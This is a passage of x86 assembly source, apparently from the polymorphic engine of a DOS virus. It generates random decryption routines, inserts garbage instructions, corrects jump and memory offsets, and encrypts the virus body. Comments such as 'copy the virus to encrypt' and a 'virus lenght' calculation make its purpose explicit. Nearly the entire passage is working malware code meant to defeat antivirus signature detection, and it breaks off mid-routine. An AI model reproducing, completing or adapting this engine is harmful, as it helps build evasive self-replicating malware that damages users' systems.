   ; rda_add will be used to point with si to the memory buffer where the
   ; address of each generated step (from the steps table) will be stored
   ; (so later offset correction, ie. for jumps, can be calculated with this
   ; informations). the way of addressing this memory zone is structured in
   ; a way so that the address of a given instruction pointed by si is stored
   ; in si + rda_add. of course for the thing to work we can address just each
   ; 2 bytes, so you'll see in the steps table that there isn't any 1 byte only
   ; step (so the rets, that should be 1 byte only, are padded with one more byte)


   main_rda_loop_body:
           push    cx
           mov [si+rda_add], di
           mov byte ptr ds:[rda_garbage_limits], 0 ; reset limit
           mov dl, [bx]            ; get step type

           test    dl, 10h
           jz  just_copy_whatever
           test    dl, 2
           jz  garbage_in_rda_skip_typelim1
           or  byte ptr ds:[rda_garbage_limits], 1

   garbage_in_rda_skip_typelim1:
           test    dl, 4
           jz  just_copy_whatever_new_regcompat
           or  byte ptr ds:[rda_garbage_limits], 2

   just_copy_whatever_new_regcompat:
           inc bx
           mov dl, [bx]        ; hold register compatibility
                           ; info, that is which can be
                           ; used as garbage
   just_copy_whatever:
           mov cl, [bx+1]      ; hold nr of bytes to copy
           repe movsb          ; copy needed stuff
           cmp dl, 0
           jnz some_reg_is_usable_for_grb
           jmp short move_for_next_loop

   some_reg_is_usable_for_grb:
           mov byte ptr ds:[register_compat], 0FFh ; all regs
           mov byte ptr ds:[register_compat + 1], 0FFh ; usable
           xor ds:[register_compat + 1], dl
           mov al, dl
           and al, 0Fh
           xor ds:[register_compat], al    ; set to the mask
           mov cl, 4               ; given by the table
           shl al, cl
           xor ds:[register_compat], al

           mov ax, 5           ; how many garbage instrs
           call    get_random_limit
           or  ax, ax
           jz  move_for_next_loop

           mov cx, ax
   rda_garbage_loop_1:
           push    cx
           test    byte ptr ds:[rda_garbage_limits], 2
           jnz some_type_limit_set

   select_a_reg_rdag:
           mov ax, 7
           call    get_random_limit    ; select garbage reg
           mov cx, ax
           mov ax, 1
           shl ax, cl
           test    [bx], al        ; is still compatible?
           jz  select_a_reg_rdag
           mov ds:[garbage_register], cl
           mov word ptr ds:[garbage_word_byte], 1
           push    si
           push    bx

           test    byte ptr ds:[rda_garbage_limits], 1
           jz  np_nolimits_rgrb

           mov ax, 0Eh
           call    get_instr_with_compat
           jmp short generate_rda_ginst

   some_type_limit_set:
           push    si
           push    bx
           mov ax, 9
           call    get_instr_with_compat
           jmp short generate_rda_ginst

   np_nolimits_rgrb:
           call    get_instr_from_table    ; set si to an entry in the
                           ; table

   generate_rda_ginst:
           call    call_generator      ; call appropriate handler
                           ; for the entry pointed by si
           pop bx
           pop si
           pop cx
           loop    rda_garbage_loop_1

   move_for_next_loop:
           add bx, 2           ; to next entry
           pop cx
           dec cx          ; loop counter
           jcxz    end_rda_basic_body_gen
           jmp main_rda_loop_body

   ; now the entire rda routine has been placed and now the modifications and
   ; assignations are needed (ie. correct all the jump offsets, since garbage
   ; was inserted and so on)

   end_rda_basic_body_gen:
           sub di, 2
           call    rda_corr_mem_offsets    ; correct any memory reference

           mov ax, 10h
           call    get_random_limit
           mov ds:[rda_add_to_lenght_rnd], ax

           mov si, word ptr [rda_add + offset rda_add_di_instr]
           add [si+2], ax      ; the correction of di before
                           ; the cmp cs:[di],dx in the
                           ; rda code depending on how
                           ; many nops we stored
           xchg    ax, cx
           mov al, 90h
           repe stosb

           mov cx, ds:[poly_reg_cx]
           mov si, ds:[poly_reg_si]
           repe movsb          ; copy the virus to encrypt
           pop ax
           mov ds:[poly_total_lenght], di
           sub ds:[poly_total_lenght], ax

           dec di
           mov ds:[pnt_to_end_after_rda], di

           push    di
           mov si, word ptr [rda_add + offset rda_second_dw_0]
                       ; pointer to second 00 dw in rda
           mov ax, ds:[rda_add_to_lenght_rnd]
           mov word ptr [si],(code_end-virus_begin) ; virus lenght
           add [si], ax                 ; + 0-10h random

           mov ax, word ptr [rda_add + offset rda_end_basic_bodycode]
                       ; pointer to end (to the nops)
           sub ax, word ptr [rda_add + offset rtc_comm_routine]
           add ax, 0AFh
           add ax, ds:[rda_add_to_lenght_rnd]
           mov si, word ptr [rda_add + offset rda_fourth_dw_0]
                       ; pointer to fourth 00 dw
           mov [si], ax

           mov ax, 0FFFFh
           call    get_random_limit
           mov si, word ptr [rda_add + offset rda_third_dw_0]
                       ; pointer to third 00 dw
           mov [si], ax

           mov si, word ptr [rda_add + offset rda_first_db_0]
           mov byte ptr [si], 0FFh

           mov ax, ds:[rda_modulusv]
           call    get_random_limit
           mov si, word ptr [rda_add + offset rda_first_dw_0]
                       ; pointer to first 00 dw
           mov [si], ax

           mov ax, 3
           call    get_random_limit
           xchg    ax, bx
           shl bx, 1
           shl bx, 1
           mov ax, [bx+offset rda_to_part_1]   ; one of the inits
           mov si, word ptr [rda_add + offset rda_init_storage_1]
           mov [si], ax    ; place it in the loop

           mov ax, [bx+offset rda_to_part_1 + 2] ; the second
           mov si, word ptr [rda_add + offset rda_init_storage_2]
           mov [si], ax    ; place in the loop

           mov ax, word ptr [rda_add + offset rda_calculate_value_in_dx]
           mov si, ds:[end_most_internal_layer]
           sub si, offset rda_basic_body
           call    ax      ; calculated value on undec body

           mov si, word ptr [rda_add + offset rda_end_basic_bodycode]
           add si, offset rda_checkvalue-100h
           add si, ds:[rda_add_to_lenght_rnd]
           mov [si], dx    ; store the calculated value

           mov si, word ptr [rda_add + offset enc_dec_byte]
           mov byte ptr [si], 1    ; next time will have to decr

           mov ax, word ptr [rda_add + offset rda_encdec_routine]
           mov si, ds:[end_most_internal_layer]
           sub si, offset rda_basic_body
           call    ax          ; execute encryptor

           mov si, word ptr [rda_add + offset rnd_seed_1]
           mov [si], ds        ; now just delete the enc data
           mov si, word ptr [rda_add + offset rnd_seed_2]
           mov [si], ds
           mov si, word ptr [rda_add + offset rda_first_dw_0]
           mov [si], ds
           pop di
           ret             ; rda finished
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   rda_corr_mem_offsets:
           push    di
           mov si, offset rda_basic_body
           lea bx, rda_steps_table
           mov cx, 0C4h        ; number of steps

   rda_corr_loop_begin:
           push    cx
           mov dl, [bx]        ; get the info byte to check
           test    dl, 10h
           jnz rda_corr_do_smthing
           jmp short rda_corr_skip_to_next

   rda_corr_do_smthing:
           test    dl, 8
           jnz rda_corr_somejump
           test    dl, 1
           jnz rda_corr_mem_references
           jmp short rda_corr_getback_2

   ; correct the displacement of a memory reference (ie. [si+666h]) to include
   ; the generated garbage
   rda_corr_mem_references:
           push    bx
           mov al, [si]    ; check for a segment override to skip
           cmp al, 2Eh     ; CS:
           jz  rda_corr_skip_seg_ov
           cmp al, 3Eh     ; DS:
           jz  rda_corr_skip_seg_ov
           cmp al, 26h     ; ES:
           jz  rda_corr_skip_seg_ov
           cmp al, 36h     ; SS:
           jnz rda_corr_mem_ref

   rda_corr_skip_seg_ov:
           inc si      ; skip the segment override

   rda_corr_mem_ref:
           mov bx, [si+2]  ; normal displacement
           mov dx, [bx+rda_add]  ; in mem position
           mov di, [si+rda_add]  ; where to place
           sub dx, ds:[end_most_internal_layer] ; real displacment
           add dx, offset rda_basic_body    ;
           mov [di+2], dx  ; put new displacment
           pop bx
           jmp short rda_corr_getback_2

   ; correct some jump type
   rda_corr_somejump:
           push    bx
           mov al, [si]    ; get type of jump

           cmp al, 0E9h    ; jmp far opcode

           jz  rda_corr_call_jmpfar

           cmp al, 0E8h    ; call opcode
           jz  rda_corr_call_jmpfar

           mov al, [si+1]  ; then we have a short jump to correct
           cbw         ; the offset
           xchg    ax, bx
           mov dx, [bx+si+rda_add+2]     ; where to jump
           sub dx, [si+rda_add]      ; from where
           mov di, [si+rda_add]      ; where to place
           sub dx, 2           ; opcode lenght
           mov [di+1], dl      ; store
           jmp short rda_corr_retback_wbx


   ; corrects the offset for a call or jmp far opcode, so the new offset will
   ; include all the generated garbage to skip.
   rda_corr_call_jmpfar:
           mov bx, [si+1]      ; get where to jump (if there
                           ; wasn't any garbage)
           mov dx, [bx+si+rda_add+3]
                           ; where actually to jump (with
                           ; the garbage included and the
                           ; call opcode lenght)
           sub dx, [si+rda_add]    ; - where is this instruction
                           ; in mem
           mov di, [si+rda_add]    ; where is this instruction in
                           ; memory
           sub dx, 3           ; - lenght of opcode
           mov [di+1], dx      ; store the new offset in place

   rda_corr_retback_wbx:
           pop bx

   rda_corr_getback_2:
           inc bx

   rda_corr_skip_to_next:
           mov al, [bx+1]      ; lenght of instruction

           cbw
           add si, ax          ; to next in plain rda alg
           add bx, 2           ; to next step in step table
           pop cx
           dec cx          ; last step?
           jz  rda_corr_exit_routine
           jmp rda_corr_loop_begin

   rda_corr_exit_routine:
           pop di
           ret


   ;    ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

   ; will correct the pointer and counter initialization instructions generated
   ; before depending on the initialization type used. just a couple of checks
   ; and lenght/pointer corrections.
   correct_pnt_addr_vals:
           mov bx, ds:[tipo_register]  ; init type used
           and bx, 3

           cmp bx, 2       ; initialized just pointer?
           jz  was_init_just_point

           cmp bx, 1       ; = 1 counter with imm and pnt
           jnz was_init_cnt0_pnt

           mov di, ds:[counter_assign_pos]
           mov ax, ds:[poly_total_lenght]
           stosw           ; so set the immediate for the cnt

   was_init_cnt0_pnt:
           cmp byte ptr ds:[pointer_direction], 0
           jnz was_init_pnt_frstart
           mov di, ds:[pointer_assign_pos]
           mov ax, ds:[pointer_to_end_after_rda_2]
           cmp word ptr ds:[counter_direction], 0
           jnz was_init_cnt_frstart
           mov ax, ds:[decryptor_ended_inmem_pnt]

   was_init_cnt_frstart:
           stosw
           mov di, ds:[counter_check_pos]
           mov ax, ds:[poly_total_lenght]
           stosw
           jmp short correct_pnt_add_exit

   was_init_just_point:
           cmp byte ptr ds:[pointer_direction], 0
           jnz was_init_pnt_frstart_2
           mov di, ds:[pointer_assign_pos]
           mov ax, ds:[decryptor_ended_inmem_pnt]
           cmp word ptr ds:[counter_direction], 0
           jz  was_init_cnt_frstart_2

           mov ax, ds:[pointer_to_end_after_rda_2]

   was_init_cnt_frstart_2:
           stosw
           mov di, ds:[counter_check_pos]
           cmp word ptr ds:[counter_direction], 1
           jz  was_init_cnt_frend_2
           add ax, ds:[poly_total_lenght]
           jmp short was_init_store_cnt

   was_init_cnt_frend_2:
           sub ax, ds:[poly_total_lenght]

   was_init_store_cnt:
           stosw
           jmp short correct_pnt_add_exit


   was_init_pnt_frstart_2:
           cmp word ptr ds:[counter_direction], 1
           jz  no_countercheck_anyway

   was_init_pnt_frstart:
           mov di, ds:[counter_check_pos]
           mov ax, ds:[poly_total_lenght]
           stosw

   no_countercheck_anyway:
           mov di, ds:[pointer_assign_pos]
           mov ax, ds:[poly_total_lenght]
           cmp word ptr ds:[counter_direction], 1
           jz  from_endtobegin
           xor ax, ax
   from_endtobegin:
           stosw
           mov cx, ds:[howmany_from_used_table]
           mov bp, ds:[layer_sp_pointer]
           mov ax, ds:[decryptor_ended_inmem_pnt]
           cmp word ptr ds:[counter_direction], 0
           jz  fin_clearloop
           dec ax
   fin_clearloop:
           mov di, [bp+10h]
           stosw
           inc bp
           inc bp
           loop    fin_clearloop

   correct_pnt_add_exit:
           ret


   register_assign_init:
           mov bx, ds:[tipo_register]      ; type of init
           shl bx, 1
           jmp [offset table_init_type + bx]   ; select from table one
                               ; of the three below

   ;    ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

   ; this sets the counter to zero using one of the three different types
   ; available (xor reg,reg ; sub reg,reg ; and reg,0) and sets the pointer
   ; with a normal mov. saves the pointer assignation position.
   i_routines_cnt_to_zero_and_pnt:
           mov word ptr ds:[garbage_word_byte], 1
           mov al, ds:[counter_register]
           mov ds:[garbage_register], al
           mov ax, 2           ; first three service routines
           call    get_random_limit    ; will zero the requested
           mov bx, ax          ; register in different ways
           shl bx, 1
           call    [offset service_routines_table + bx]

           mov al, 0B8h        ; mov reg16,imm
           or  al, ds:[pointer_register]
           stosb
           mov ds:[pointer_assign_pos], di
           jmp short set_the_last_off_i

   ; this initializes the pointer and counter with normal mov instructions and
   ; saves both pointer and counter initialization position if it could be filled
   ; later
   i_routines_cnt_pnt_with_imm:
           mov al, 0B8h        ; mov reg16,imm
           or  al, ds:[counter_register]
           stosb
           mov ds:[counter_assign_pos], di
           mov ax, ds:[poly_total_lenght]
           stosw

           mov al, 0B8h        ; mov reg16,imm
           or  al, ds:[pointer_register]
           stosb
           mov ds:[pointer_assign_pos], di
           jmp short set_the_last_off_i

   ; this initializes just the pointer register, so special care will be taken
   ; in a later stage for the counter conditions. pointer init position is saved
   i_routines_just_pointer:
           mov al, 0B8h        ; mov reg16,imm
           or  al, ds:[pointer_register]
           stosb
           mov ds:[pointer_assign_pos], di

   set_the_last_off_i:
           xor ax, ax
           stosw
           mov ds:[dec_loop_begin_pos], di
           ret

   ;    ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


   exitloop_condition_gen:
           mov word ptr ds:[counter_check_pos], offset dumb_cntr_ass
           mov al, 40h         ; inc opcode
           cmp word ptr ds:[counter_direction], 0
           jz  clear_prefetch_if_dn
           mov ax, 0EBh
           stosw           ; jmp to next instruction
           mov al, 48h     ; dec opcode

   clear_prefetch_if_dn:
           or  al, ds:[pointer_register]
           stosb
           mov bx, ds:[tipo_register]  ; how did we initialize?
           shl bx, 1           ; do the check to match init
           jmp word ptr [table_end_loop_check + bx]

   ;
   ; the code for the three routines from the table_end_loop_check table
   ;

   endloop_check_counter_upwards:
           mov al, 40h     ; inc opcode
           or  al, ds:[counter_register]
           stosb

           mov al, 81h     ; generate check for end of loop
           stosb           ;
           mov al, 0F8h    ; cmp counter,imm
           or  al, ds:[counter_register]
           stosb           ;
           jmp short cmp_wzero ; with imm = 00

   endloop_check_counter_down_wl:
           cmp byte ptr ds:[counter_register], 1   ; is cx?
           jz  is_cx_so_can_loop

   endloop_check_counter_down:
           mov al, 48h     ; dec counter
           or  al, ds:[counter_register]
           stosb
           jmp short put_thefin_jne

   is_cx_so_can_loop:
           mov al, 0E2h    ; loop opcode
           stosb
           jmp short add_loop_offset

   endloop_check_just_pointer:
           mov al, 81h     ; cmp pointer,imm
           stosb
           mov al, 0F8h
           or  al, ds:[pointer_register]
           stosb
   cmp_wzero:
           mov ds:[counter_check_pos], di  ; save if has to be
           xor ax, ax              ; changed later
           stosw

   put_thefin_jne:
           mov al, 75h     ; jne opcode
           stosb

   add_loop_offset:
           mov ax, di      ; calculate the jump offset
           inc ax
           sub ax, ds:[dec_loop_begin_pos]
           neg ax
           stosb
           mov ds:[dec_loop_end_pos], di
           ret


   check_for_segovv:
           cmp [need_segovv], 1    ; need to force CS: ?
           jz  no_segovv_ndd
           mov al, 2Eh     ; CS: segment override
           stosb
   no_segovv_ndd:
           ret



   generate_math_on_mem_ops:
           mov word ptr ds:[math_seq_stack_off], 0
           mov cx, ds:[howmany_from_used_table]
           sub si, si
           sub bx, bx
           mov bp, ds:[layer_sp_pointer]   ; to our current stack
                               ; reserved space
   mom_loop_gen:
           push    si
           push    bx
           push    cx
           call    check_for_segovv
           mov bl, [bp+si]         ; get the value from
           shl bx, 1               ; stack and create
           push    si              ; offset
           add bx, ds:[pointer_to_used_table]
           call    word ptr [bx]           ; call table entry
           pop si
           shl si, 1

           cmp byte ptr ds:[pointer_direction], 0
           jz  mom_loop_next
           mov [bp+si+10h], di
           mov ax, 0
           stosw
   mom_loop_next:
           pop cx
           pop bx
           pop si
           inc si
           loop    mom_loop_gen
           ret


   correct_regpair_in_al:
           cmp byte ptr ds:[create_or_just_read], 1
   ;
   ; if = 0 then we are creating the memory modificating code, so this routine
   ;    must generate the [pnt],reg pair for the instruction and put it in al
   ; if = 1 then we are just creating the inverse algorithm, so the routine will
   ;    just read the corrispondent register pair from the stack structure
   ;    and pass it back in al.
   ;
           jz  just_reading_already_existing

   chk_reselect_reg:
           mov ax, 7
           call    get_random_limit        ; get a random reg
                               ; to operate with
           cmp byte ptr ds:[pointer_register], 3
           jnz proceed_next_check
           cmp al, 3
           jz  chk_reselect_reg
           cmp al, 7
           jz  chk_reselect_reg
   proceed_next_check:
           cmp byte ptr ds:[pointer_register], 7
           jnz chk_not_di
           mov bl, 5
   chk_not_di:
           cmp byte ptr ds:[pointer_register], 6
           jnz chk_not_si
           mov bl, 4
   chk_not_si:
           cmp byte ptr ds:[pointer_register], 5
           jnz chk_not_bp
           mov bl, 6
   chk_not_bp:
           cmp byte ptr ds:[pointer_register], 3
           jnz chk_not_bx
           mov bl, 7
   chk_not_bx:
           shl ax, 1
           shl ax, 1
           shl ax, 1
           or  al, bl
           mov ah, ds:[pointer_direction]
           mov cl, 7
           shl ah, cl
           or  al, ah

           push    si
           mov si, ds:[math_seq_stack_off] ; to correct entry
           mov bp, ds:[layer_sp_pointer]   ; to stack zone
           mov [bp+si+30h], al         ; save on stack for l8r
           inc word ptr ds:[math_seq_stack_off] ; on next one
           pop si
           ret

   just_reading_already_existing:
           push    si
           mov bp, ds:[layer_sp_pointer]   ; to stack zone
           mov si, ds:[math_seq_stack_off] ; to correct entry
           mov al, [bp+si+30h]         ; get it off stack
           pop si
           inc word ptr ds:[math_seq_stack_off] ; on next
           ret


   ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;
   ; routines that create math operations on memory
   ;
   mom_routines_xor_mem:
           mov al, 30h     ; xor [reg],reg
           stosb
           call    correct_regpair_in_al
           stosb
           ret

   mom_routines_add_mem:
           mov al, 0       ; add [reg],reg
           stosb
           call    correct_regpair_in_al
           stosb
           ret

   mom_routines_sub_mem:
           mov al, 28h     ; sub [reg],reg
           stosb
           call    correct_regpair_in_al
           stosb
           ret

   mom_routines_ror_1_mem:
           mov al, 0D0h    ; ror [reg],1
           stosb
           call    correct_regpair_in_al
           and al, 0C7h
           or  al, 8
           stosb
           ret

   mom_routines_ror_cl_mem:
           mov al, 0D2h    ; ror [reg],cl
           stosb
           call    correct_regpair_in_al
           and al, 0C7h
           or  al, 8
           stosb
           ret

   mom_routines_rol_1_mem:
           mov al, 0D0h    ; rol [reg],1
           stosb
           call    correct_regpair_in_al
           and al, 0C7h
           stosb
           ret

   mom_routines_rol_cl_mem:
           mov al, 0D2h    ; rol [reg],cl
           stosb
           call    correct_regpair_in_al
           and al, 0C7h
           stosb
           ret

   mom_routines_inc_mem:
           mov al, 0FEh    ; inc [reg]
           stosb
           call    correct_regpair_in_al
           and al, 0C7h
           stosb
           ret

   mom_routines_dec_mem:
           mov al, 0FEh    ; dec [reg]
           stosb
           call    correct_regpair_in_al
           and al, 0C7h
           or  al, 8
           stosb
           ret

   mom_routines_neg_mem:
           mov al, 0F6h    ; neg [reg]
           stosb
           call    correct_regpair_in_al
           and al, 0C7h
           or  al, 18h
           stosb
           ret

   mom_routines_not_mem:
           mov al, 0F6h    ; not [reg]
           stosb
           call    correct_regpair_in_al
           and al, 0C7h
           or  al, 10h
           stosb
           ret
   ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   poly_init_stage1:
           push    ax bx cx dx di si es ds

           mov byte ptr ds:[register_compat + 1], 0
           mov byte ptr ds:[register_compat], 0

           mov ax, 10h
           call    get_random_limit
           mov ds:[garbage_instr_number], al

   begin_initreg_stuff:
           mov byte ptr ds:[restrict_grb_ax_is_used], 0
           mov byte ptr ds:[using_8_bits_register], 0

           call    select_garbage_register
           call    check_reg_compatibility
           jz  no_garb_limitnd

           mov ax, 6
           call    get_instr_with_compat
           call    call_generator

   init_ended_chk:
           call    check_init
           cmp byte ptr ds:[register_compat + 1], 0EFh
           jnz begin_initreg_stuff     ; all initialized?
           mov ds:[all_regs_initial_pnt], di
           pop ds es si di dx cx bx ax

           mov di, ds:[all_regs_initial_pnt]   ; store end of this
           ret                 ; part
   no_garb_limitnd:
           call    check_garbage_ended
           jmp short init_ended_chk

   check_garbage_ended:
           cmp byte ptr ds:[garbage_instr_number], 0   ; finished
           jz  garbage_instr_fnshed            ; garb instr?
           dec byte ptr ds:[garbage_instr_number]
           jmp short do_one_garbage_instr

   garbage_instr_fnshed:
           call    get_random_0_or_1
           cmp ax, 0
           jnz do_one_garbage_instr
           mov ax, 5
           call    get_random_limit
           mov bx, ax          ; initialize the register
           shl bx, 1           ; to a known value
           call    [offset service_routines_table + bx]

           mov cl, ds:[garbage_register]
           mov al, 1
           shl al, cl
           mov si, ds:[garbage_word_byte]
           or  [si+register_compat], al    ; mark as initialized
           jmp short exit_this_stage

   do_one_garbage_instr:
           call    get_instr_from_table   ; select instruction from table
           call    call_generator         ; generate code using table info
                              ; with appropriate handler
   exit_this_stage:
           ret

   check_init:
           mov cx, 4
           mov al, 11h

   check_init_loop:
           mov ah, ds:[register_compat]
           and ah, al
           cmp ah, al
           jnz check_init_fc
           mov bl, al
           and bl, 0Fh             ; low nibble
           or  ds:[register_compat + 1],bl
           jmp short not_used_in_this
   check_init_fc:
           mov bl, al
           and bl, 0Fh
           test    ds:[register_compat + 1], bl    ; used in this exec?
           jz  not_used_in_this
           or  ds:[register_compat], al    ; signal usage
   not_used_in_this:
           shl al, 1       ; check next bit (register)
           loop    check_init_loop
           ret


   ;
   ; selects garbage register and the dimension (w/b) and stores it in memory
   ;
   select_garbage_register:
           call    get_random_0_or_1   ; word or byte
           mov ds:[garbage_word_byte], ax

   redo_sel_gs:
           mov ax, 7           ; get a register for garbage
           call    get_random_limit

           cmp word ptr ds:[garbage_word_byte], 1
           jnz no_sp_check_needed_gs

           cmp al, 4           ; do not use SP
           jz  redo_sel_gs     ; redo selection

   no_sp_check_needed_gs:
           mov ds:[garbage_register], al   ; save reg
           ret

   ;
   ; gets:  si pointer to entry table
   ;
   call_generator:
           lodsb           ; gets byte from table
           and al, 0Fh     ; last nibble contains both lenght
                       ; and type of instruction
           mov bl, al
           xor bh, bh      ; calculate pointer to handler
           shl bl, 1
           dec si      ; to beginning of entry
           jmp [offset routines_table + bx]


   ;
   ; gets:     si pointer to table entry
   ; returns:  ax lenght of the table entry
   ;
   move_through_table:

           lodsb           ; get the first byte of the entry
           and al, 0Fh     ; lower nibble needed for lenght

           cmp al, 2
           jz  entry_long_two_bytes

           cmp al, 3
           jz  entry_long_two_bytes

           cmp al, 6
           jz  entry_long_two_bytes

           cmp al, 7
           jz  entry_lenght_coded_in_hn

           mov ax, 1       ; else long 1 byte

   return_move_through_table:
           dec si      ; restore si (for previous lodsb)
           ret

   entry_long_two_bytes:
           mov ax, 2
           jmp short return_move_through_table


   entry_lenght_coded_in_hn:
           dec si
           lodsb               ; reget full byte
           shr al, 1           ; shift the lower nibble
           shr al, 1           ; out and keep the higher
           shr al, 1           ; that holds instruction
           shr al, 1           ; length
           xor ah, ah
           jmp short return_move_through_table

   ;
   ; returns: si pointer to selected entry in the table
   ;
   get_instr_from_table:
           mov si, offset i_table_start
           mov ax, 60h
           call    get_random_limit    ; select entry from table
           xchg    ax, cx
           jcxz    no_end_table_ff

   table_skipping_loop:
           call    end_table_ff_check  ; check for end
           call    move_through_table  ; get lenght entry
           inc si
           add si, ax          ; and skip the entry
           loop    table_skipping_loop ; loop to desired entry


   end_table_ff_check:
           cmp byte ptr [si], 0FFh ; reached end of table
           jnz no_end_table_ff
           mov si, offset i_table_start    ; if so restart
   no_end_table_ff:
           ret


   ;
   ; gets:    dx value of compatible entries to check with the hn
   ; returns: si pointer to selected entry in table
   ;
   get_instr_with_compat:
           mov dx, ax      ; dx holds compatible type
           mov si, offset i_table_start
           mov ax, 5Fh     ; select random instruction from tbl
           call    get_random_limit
           xchg    ax, cx
           inc cx

   loop_search_compat:
           call    end_table_ff_check

           lodsb           ; get info byte from table entry
           dec si
           push    ax
           and al, 0Fh     ; mask low nibble
           cmp al, 7       ; high nibble means lenght?
           pop ax
           jz  skip_this_entry ; don't use variable lenght entries

           shr al, 1       ; push away lower nibble
           shr al, 1
           shr al, 1
           shr al, 1

           and al, dl      ; al has compatibility info
           cmp al, dl
           jnz skip_this_entry
           dec cx      ; if compatible count this
           jz  end_table_ff_check

   skip_this_entry:
           call    move_through_table
           add si, ax          ; skip entry
           inc si
           jmp short loop_search_compat



   check_reg_compatibility:
   ; checks if the garbage register is compatible with the used regs
   ; returns flags to confirm. Z ok, NZ not ok

           push    cx ax si
           cmp word ptr ds:[garbage_word_byte], 1
           jz  rc_check_bytesize
           mov cl, ds:[garbage_register]
           mov al, 1           ; check the right bit
           shl ax, cl
           test    ds:[register_compat], al
   rc_exitrout:
           pop si ax cx
           ret

   rc_check_bytesize:
           mov cl, ds:[garbage_register]
           mov al, 1
           shl ax, cl
           test    ds:[register_compat + 1], al
           jnz rc_exitrout
           cmp cl, 3           ; if < must check 8bit aswell
           ja  gewd_regcomp_exit
           mov al, 11h
           shl ax, cl          ; check both 8bits regs
           test    ds:[register_compat], al
           jz  gewd_regcomp_exit
           mov byte ptr ds:[using_8_bits_register], 1

   gewd_regcomp_exit:
           xor ah, ah          ; just set the Z flag
           cmp ah, 0
           jmp short rc_exitrout


   ; put a register that has been already initialized in bl
   get_a_reg_in_bl_usable:
           push    cx
           push    si
   find_areg_usable:
           mov ax, 7
           call    get_random_limit
           mov cx, ax              ; get a reg
           mov al, 1               ; its coding
           xor ah, ah
           shl ax, cl
           mov si, ds:[garbage_word_byte]
           test    [si+register_compat], al    ; ok if already used
           jz  find_areg_usable
           pop si
           mov bl, cl              ; return in bl
           pop cx
           ret

   ; creates many types of instructions depending on the given data byte. the
   ; instructions can either have registers as source and destionation or can
   ; have a memory reference (also with registers used as pointer) as the source.
   routines_various_memoff_or_rr:
           cmp byte ptr ds:[using_8_bits_register], 1
           jz  come_home_rout
           inc si
           call    check_reg_compatibility ; with reg or without?
           jz  dontuse_grbreg

           mov bx, ds:[garbage_word_byte]
           cmp byte ptr [bx+register_compat], 0    ; no regs used?
           jz  come_home_rout

           lodsb
           or  ax, ds:[garbage_word_byte]
           stosb
           call    get_a_reg_in_bl_usable  ; get an initialized reg
           mov al, 0C0h
           or  al, ds:[garbage_register] ; dest

           shl bl, 1           ; reg * 8, src
           shl bl, 1
           shl bl, 1
           or  al, bl          ; make it with that reg
           stosb               ; store
           ret


   dontuse_grbreg:
           lodsb               ; get the data byte
           or  ax, ds:[garbage_word_byte]
           or  al, 2
           stosb

           mov ax, 0FF14h
           call    get_random_limit    ; here we select some random
                           ; reg/regs to be used as pnt
           and al, 0C7h
           mov bl, ds:[garbage_register]
           shl bl, 1           ; reg * 8, this is the dest
           shl bl, 1
           shl bl, 1
           or  al, bl          ; make it with that reg
           stosb               ; store
           push    ax
           pop bx
           and al, 0C0h

           cmp al, 40h         ; see which kind of op has
           jz  requires_a_byte     ; been generated and put some
                           ; more bytes if needed. this
           cmp al, 80h         ; bytes should be memory
           jz  requires_a_word     ; offsets (ie. [bx+123])

           cmp al, 0
           jnz come_home_rout
           and bl, 7
           cmp bl, 6
           jz  requires_a_word

           mov al, [di-1]
           or  al, 0C0h
           mov [di-1], al
   come_home_rout:
           ret


   requires_a_word:
           mov ax, 9E6Ah
           call    get_random_limit
           cmp ax, 0
           jnz not_zero_hh
           inc ax
   not_zero_hh:
           stosw
           jmp short come_home_rout


   requires_a_byte:
           mov al, ah
           cmp al, 0       ; zero not allowed
           jnz not_zero_hhh
           inc al
   not_zero_hhh:
           stosb
           jmp short come_home_rout

   ;
   ; copies one byte from the data bytes of the entry and then puts an
   ; immediate after it (word or byte depending on [garbage_word_byte]).
   ; this doesn't use the selected garbage register, but rather it uses the
   ; one defined already by the opcode in the table.
   ;
   routines_copy_one_plus_imm:
           cmp byte ptr ds:[garbage_register], 0   ; is ax?
           jnz copi_notusingax
           cmp byte ptr ds:[using_8_bits_register], 1
           jz  copi_return_fr

   copi_notusingax:
           test    byte ptr ds:[register_compat + 1], 1    ; ax used?
           jnz copi_alnotused
           test    byte ptr ds:[register_compat], 11h  ; used ah/al
           jnz copi_return_fr

   copi_alnotused:
           cmp byte ptr ds:[restrict_grb_ax_is_used], 1
           jz  copi_return_fr

           mov ax, 0C350h
           call    get_random_limit

           push    ax
           inc si      ; copy the immediate
           lodsb
           cmp word ptr ds:[garbage_word_byte], 1
           jnz copi_byte_dimension

           or  al, 1           ; word dim and store everything
           stosb
           pop ax
           stosw
           jmp short copi_return_fr

   copi_byte_dimension:
           and al, 0FEh        ; here is byte
           stosb
           pop ax
           stosb

   copi_return_fr:
           ret


   ; creates math instructions that uses an immediate
   routines_math_with_immediate:
           cmp byte ptr ds:[using_8_bits_register], 1
           jz  man_with_imm_ret

           inc si
           lodsb                   ; first byte opcode
           or  ax, ds:[garbage_word_byte]  ; dimension
           stosb                   ; ok!

           lodsb                   ; second byte opcode
